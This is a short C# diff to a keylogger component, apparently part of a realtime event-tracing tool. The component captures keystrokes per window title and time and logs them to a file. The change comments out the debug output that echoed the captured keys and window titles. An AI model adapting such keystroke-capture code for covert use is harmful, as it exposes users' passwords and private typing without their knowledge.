@@ -1603,14 +1603,14 @@ namespace AppRealtime
                                             "Window  : " + props["Window"] + Environment.NewLine +
                                             "Time    : " + props["Time"] + Environment.NewLine +
                                             "----------------------------------------------";
-                    //Console.WriteLine();
-                    //Console.WriteLine();
-                    //Console.WriteLine(titleString);
-                    //Console.WriteLine();
-                    Trace.WriteLine("");
-                    Trace.WriteLine("");
-                    Trace.WriteLine(titleString);
-                    Trace.WriteLine("");
+                    ////Console.WriteLine();
+                    ////Console.WriteLine();
+                    ////Console.WriteLine(titleString);
+                    ////Console.WriteLine();
+                    //Trace.WriteLine("");
+                    //Trace.WriteLine("");
+                    //Trace.WriteLine(titleString);
+                    //Trace.WriteLine("");
                     // Write to file
                     KeyLogger.lastTitle = props["Window"];
                     lastKeyLog = new KeyLog
@@ -1622,7 +1622,7 @@ namespace AppRealtime
                     lastMultiKeyLog.KeyLogCollection.Add(lastKeyLog);
                 }
                 //Console.Write(props["Key"]);
-                Trace.Write(props["Key"]);
+                //Trace.Write(props["Key"]);
                 // log to file here
                 lastKeyLog.KeyStringBuilder.Append(props["Key"]);
             }
@@ -1696,7 +1696,7 @@ namespace AppRealtime
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[X] Exception: {0}", ex);
+                Trace.WriteLine("[X] Exception: " + ex);
             }
         }
     }
